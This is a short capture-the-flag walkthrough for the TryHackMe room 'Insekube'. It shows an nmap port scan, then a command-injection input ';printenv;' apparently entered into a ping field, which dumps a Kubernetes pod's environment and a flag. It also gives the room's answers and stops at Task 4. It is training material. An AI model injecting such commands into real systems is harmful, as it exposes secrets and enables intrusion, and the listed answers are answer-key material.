# Insekube Walkthrough
### Link
- https://tryhackme.com/room/insekube
---
### Task 1
```
sudo nmap -p- -sS -Pn -n [IP]
```
**Namp scan result**
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
|   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
|_  256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519)
80/tcp open  http
```
**Question**
#### What ports are open? (comma separated)
**Answer** 
#### 22,80
---
### Task 2
**Question**
#### What is flag 1?

I tried to obtain information about the environment by using the command **;printenv;** 

**Result**
```
ping: usage error: Destination address required
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HOSTNAME=syringe-79b66d66d7-7mxhd
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/home/challenge
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/challenge
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
GOLANG_VERSION=1.15.7
FLAG=flag{5e7cc6165f6c2058b11710a26691bb6b}
SHLVL=1
SYRINGE_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
_=/usr/bin/printenv
```
**Answer** 
#### flag{5e7cc6165f6c2058b11710a26691bb6b}
---
### Task 3

Just Practice ^^
---
### Task 4

**Question**
#### What is flag 2?

